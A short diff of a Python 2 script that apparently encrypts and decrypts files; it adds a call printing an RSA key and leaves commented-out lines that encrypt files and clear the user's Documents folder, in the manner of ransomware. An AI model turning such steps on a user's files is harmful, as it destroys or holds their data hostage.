@@ -169,9 +169,10 @@ def decrypt(key):
     decrypt_file(key,path)
 
 if __name__ == '__main__':
-    print "asdf"
+    # print "asdf"
     # print encrypt()
     # from os.path import expanduser
     # home = expanduser("~")
     # clearFolder(home + "\Documents")
     # decrypt("]─₧↕‼♠:.{W║ú>÷bm₧⌂p∞≤ìù☻ci╤lß╨░T")
+    print generate_RSA()
